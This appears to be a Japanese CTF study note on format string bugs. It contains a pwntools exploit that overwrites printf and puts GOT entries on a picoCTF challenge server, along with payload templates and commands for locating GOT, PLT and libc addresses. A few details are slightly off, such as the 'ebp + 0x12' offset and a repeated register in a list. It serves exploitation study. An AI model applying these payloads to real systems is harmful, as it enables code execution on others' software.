# FSB ~Format String Bugs ~

書式文字列攻撃

## 手本コード

```python
from pwn import *
# rhp = {'host': '192.168.33.20', 'port':1234}
rhp = {'host': '2018shell1.picoctf.com', 'port':37402}

conn = remote(rhp['host'], rhp['port'])

binf = ELF('./echoback')
addr_got_printf = binf.got[b'printf']
addr_got_puts = binf.got[b'puts']
addr_plt_system = binf.plt[b'system']
addr_vuln = 0x80485ab

res = conn.recv()
log.info(res)

payload = p32(addr_got_printf + 2)
payload += p32(addr_got_printf)
payload += p32(addr_got_puts + 2)
payload += p32(addr_got_puts)
payload += b"%%%dx%%7$hn" % (((addr_plt_system >> 16) & 0xffff) - len(payload))
payload += b"%%%dx%%8$hn" % (((addr_plt_system & 0xffff) - ((addr_plt_system >> 16) & 0xffff) + 0x10000) % 0x10000)
payload += b"%%%dx%%9$hn" % ((((addr_vuln >> 16) & 0xffff) - (addr_plt_system & 0xffff) + 0x10000) % 0x10000)
payload += b"%%%dx%%10$hn" % (((addr_vuln & 0xffff) - ((addr_vuln >> 16) & 0xffff) + 0x10000) % 0x10000)

conn.sendline(payload)
conn.interactive()

```





## 基本手法

下のように入力して、

```
AAAA,%x,%x,%x,%x,%x,%x,%x
```

出力が下のようになれば攻撃可能。

```
AAAA,a62ac323,a62ad7a0,a5fe1c00,a62ad7a0,78252c78,0,41414141
```

この場合、入力した文字列がスタックの7番目に格納されている。



要するに、`printf` を呼び出した時、

32bitアーキテクチャでは以下のようになっている。

```
ebp 		: 元々のebp
ebp + 0x4 	: リターンアドレス
ebp + 0x8 	: 第一引数("AAAA,%x,%x,%x,%x,%x,%x,%x")
ebp + 0x12	: 第二引数（であるはずのアドレス）
.
.
.
```

よってebp + 0x8, ebp + 0xc, ebp + 0x10, ... という順番で中身がみれる。



64bitアーキテクチャでは,レジスタを引数とするので、以下のようになっている。

```
rdi : 第一引数 "AAAA,%x,%x,%x,%x,%x,%x,%x"
rsi : 第二引数 
rdx	: 第三引数
rcx : 第四引数
r8	: 第五引数
r9	: 第六引数

rbp 		: 元々のrbp
rbp + 0x8 	: リターンアドレス
rbp + 0x10 	: 第七引数(であるはずのアドレス)
rbp + 0x18	: 第八引数(であるはずのアドレス)
```

よって、rsi -> rdx -> rcx -> rdx -> r8 -> r9 -> rbp + 0x10 -> rbp + 0x18 ... という順番で見れる。



### 送り込む文字列（一般にpayloadと呼ばれる）

```
payload = <書き換えたい箇所のアドレス(*)> + '%' + <書き換える内容の文字数> + 'x' + '%' + <*がスタックの何番めに格納されているかを示す数字> + '$n'
```



### x86-64の対策

アドレスが `0x00123456` のように `00` で始まる場合、ヌル文字と認識されてうまくいかない。

この場合は、アドレスをpayloadの最後に持ってくることで対策できる。

```
payload =  '%' + <書き換える内容の文字数> + 'x' + '%' + <*がスタックの何番めに格納されているかを示す数字> + '$n' ＋ <書き換えたい箇所のアドレス(*)>
```



## pltのチェック

### コマンドから

```bash
objdump -d -M intel -j .plt --no ファイル名
```

書き換えるべきは、呼び出されている関数の

`ds:` の後に続く部分。



## GOTのチェック

```bash
readelf -r ファイル名
```

こっちでも分かる。

Offset の部分が書き換えるべきアドレス。

### pwntools

```python
binf = ELF('ファイルパス')
addr_got_setbuf = binf.got[b'setbuf']
```





## libc のチェック

`pwntool` を使えば以下の通り。

```python
libc = ELF('./libc.so.6')
offset_libc_system = libc.symbols[b'system']
```

